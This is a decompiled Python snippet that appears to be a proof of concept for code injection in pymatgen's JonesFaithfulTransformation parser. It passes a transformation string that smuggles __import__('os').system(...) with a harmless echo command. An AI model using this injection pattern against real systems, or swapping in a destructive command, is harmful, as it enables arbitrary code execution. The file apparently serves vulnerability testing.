# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 1094_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 308 bytes
from pymatgen.transformations.standard_transformations import JonesFaithfulTransformation
transformation_str = "__import__('os').system('echo Vulnerable!')"
transformation = JonesFaithfulTransformation.from_transformation_str(transformation_str)

# okay decompiling 1094_1.pyc
